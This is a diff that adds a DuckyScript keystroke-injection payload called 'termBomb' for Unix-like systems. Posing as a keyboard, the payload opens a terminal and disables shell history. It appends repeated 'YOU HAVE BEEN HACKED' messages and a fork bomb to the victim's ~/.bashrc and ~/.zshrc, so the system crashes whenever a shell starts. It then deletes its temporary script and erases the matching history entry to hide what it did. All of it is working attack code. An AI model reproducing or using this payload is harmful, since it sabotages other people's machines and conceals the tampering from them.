@@ -1,0 +1,60 @@
+REM Title: termBomb
+REM Description: termBomb prompts message "!!!!!!YOU HAVE BEEN HACKED!!!!!!" and executes fork bomb on launching shell/terminal.
+REM Author: drapl0n
+REM Version: 1.0+FP Edition
+REM Category: Execution
+REM Target: Unix-like operating systems. Linux launcher+delay edit by FalsePhilosopher
+REM Attackmode: HID
+DELAY 300
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 1500
+REM sneakyboi method 2
+STRING set +o history
+DELAY 200
+ENTER
+DELAY 200
+STRING cat <<EOF > /tmp/tmppp
+ENTER
+DELAY 200
+STRING ls -a | grep 'zshrc' &> /dev/null
+ENTER
+DELAY 200
+STRING if [ 0 = 0 ]; then
+ENTER
+DELAY 200
+STRING         echo -e "echo -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"" >> ~/.zshrc
+DELAY 400
+ENTER
+DELAY 200
+STRING         echo ":(){ :|:& };:" >> ~/.zshrc
+DELAY 200
+ENTER
+DELAY 200
+STRING fi
+ENTER
+DELAY 200
+ENTER
+STRING ls -a | grep 'bashrc' &> /dev/null
+ENTER
+DELAY 200
+STRING if [ 0 = 0 ]; then
+DELAY 200
+ENTER
+STRING         echo -e "echo -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"\necho -e \""'!!!!!!YOU HAVE BEEN HACKED!!!!!!"'"" >> ~/.bashrc
+DELAY 200
+ENTER
+STRING         echo ":(){ :|:& };:" >> ~/.bashrc
+DELAY 200
+ENTER
+STRING fi
+DELAY 200
+ENTER
+STRING EOF
+DELAY 200
+ENTER
+DELAY 300
+STRING chmod +x /tmp/tmppp && /tmp/./tmppp && rm /tmp/tmppp && history | grep history && line=$(history | grep history | awk '{ print $1 }') && history -d $line && set -o history && exit
+DELAY 200
+ENTER
